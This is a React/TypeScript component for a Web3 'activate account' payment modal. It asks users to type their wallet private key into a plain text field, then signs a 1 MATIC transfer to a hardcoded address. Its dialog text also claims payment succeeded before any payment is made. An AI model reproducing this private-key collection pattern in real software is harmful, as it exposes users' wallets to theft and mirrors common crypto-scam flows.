import { Dialog, Transition } from '@headlessui/react';
import axios from 'axios';
import { Fragment, useState } from 'react';
import { useAccount } from 'wagmi';
import Web3 from 'web3';

export const ActivateAcountBtn = ({context}:any) => {
  const [isOpen, setIsOpen] = useState(false);
  const [privateKey, setPrivateKey] = useState('');

  const { address } = useAccount();

  const closeModal = () => {
    setIsOpen(false);
  };

  const openModal = () => {
    setIsOpen(true);
  };

  const handlePay = async () => {
    if (!privateKey) {
      alert('Please enter your private key.');
      return;
    }

    const web3 = new Web3((window as any).ethereum);

    if (!web3) {
      console.error('Web3 not available.');
      return;
    }

    const fromAddress = `${address}`;
    const toAddress = '0xA1b89bf4F9e6e066E897C94A9f24e0bB7526d4bf';
    const amountInMatic = '1';

    try {
      const nonce = await web3.eth.getTransactionCount(fromAddress);
      const gasPrice = await web3.eth.getGasPrice();

      const privateKeyBuffer = Buffer.from(privateKey, 'hex');

      const rawTransaction = {
        from: fromAddress,
        to: toAddress,
        value: web3.utils.toWei(amountInMatic, 'ether'),
        gas: 21000,
        gasPrice: gasPrice,
        nonce: nonce,
      };

      const signedTransaction = await web3.eth.accounts.signTransaction(
        rawTransaction,
        privateKeyBuffer
      );

      const receipt = await web3.eth.sendSignedTransaction(
        signedTransaction.rawTransaction
      );

      alert(`Payment Successful! Transaction Hash: ${receipt.transactionHash}`);
      const response = await axios.put(`https://web-3-be.onrender.com/api/v1/auth/activeuser/${address}`)
      if(response.status===200){
        alert("account activated")
        closeModal();
      }else{
        alert("Server error")
        closeModal();
      }
      
    } catch (error) {
      console.error('Transaction Error:', error);
      alert(`Payment Failed. Error: ${error}`);
    }
  };

  return (
    <>
      
      <button  onClick={openModal} title="Save" className="cursor-pointer flex items-center fill-lime-400 bg-lime-950 hover:bg-lime-900 active:border active:border-lime-400 rounded-md duration-100 p-2">
      <svg className="svgIcon h-4 w-4 mr-1" viewBox="0 0 576 512"><path d="M512 80c8.8 0 16 7.2 16 16v32H48V96c0-8.8 7.2-16 16-16H512zm16 144V416c0 8.8-7.2 16-16 16H64c-8.8 0-16-7.2-16-16V224H528zM64 32C28.7 32 0 60.7 0 96V416c0 35.3 28.7 64 64 64H512c35.3 0 64-28.7 64-64V96c0-35.3-28.7-64-64-64H64zm56 304c-13.3 0-24 10.7-24 24s10.7 24 24 24h48c13.3 0 24-10.7 24-24s-10.7-24-24-24H120zm128 0c-13.3 0-24 10.7-24 24s10.7 24 24 24H360c13.3 0 24-10.7 24-24s-10.7-24-24-24H248z"></path></svg>
  <span className="text-xs md:text-sm text-yellow-400 font-bold pr-1">{context}</span>
</button>
      <Transition appear show={isOpen} as={Fragment}>
        <Dialog as="div" className="relative z-10" onClose={closeModal}>
          <Transition.Child
            as={Fragment}
            enter="ease-out duration-300"
            enterFrom="opacity-0"
            enterTo="opacity-100"
            leave="ease-in duration-200"
            leaveFrom="opacity-100"
            leaveTo="opacity-0"
          >
            <div className="fixed inset-0 bg-black/25" />
          </Transition.Child>

          <div className="fixed inset-0 overflow-y-auto">
            <div className="flex min-h-full items-center justify-center p-4 text-center">
              <Transition.Child
                as={Fragment}
                enter="ease-out duration-300"
                enterFrom="opacity-0 scale-95"
                enterTo="opacity-100 scale-100"
                leave="ease-in duration-200"
                leaveFrom="opacity-100 scale-100"
                leaveTo="opacity-0 scale-95"
              >
                <Dialog.Panel className="w-full max-w-md transform overflow-hidden rounded-2xl bg-gray-800 p-6 text-left align-middle shadow-xl transition-all">
                  <Dialog.Title
                    as="h3"
                    className="text-lg font-medium leading-6 text-gray-200"
                  >
                    Activate your account
                  </Dialog.Title>
                  <div className="mt-2">
                    <p className="text-sm text-gray-300">
                      Your payment has been successfully submitted. We’ve sent
                      you an email with all of the details of your order.
                    </p>
                  </div>

                  <div className="mt-4 flex justify-center">
                    <input
                      type="text"
                      placeholder="Enter Private Key"
                      className="p-2 border border-gray-500 rounded"
                      value={privateKey}
                      onChange={(e) => setPrivateKey(e.target.value)}
                    />
                    <button
                      type="button"
                      className="inline-flex justify-center rounded-md border border-transparent bg-yellow-400 px-4 py-2 text-sm font-medium text-gray-900 hover:bg-yellow-500 focus:outline-none focus-visible:ring-2 focus-visible:ring-blue-500 focus-visible:ring-offset-2 ml-2"
                      onClick={handlePay}
                    >
                      Pay now
                    </button>
                  </div>
                </Dialog.Panel>
              </Transition.Child>
            </div>
          </div>
        </Dialog>
      </Transition>
    </>
  );
};
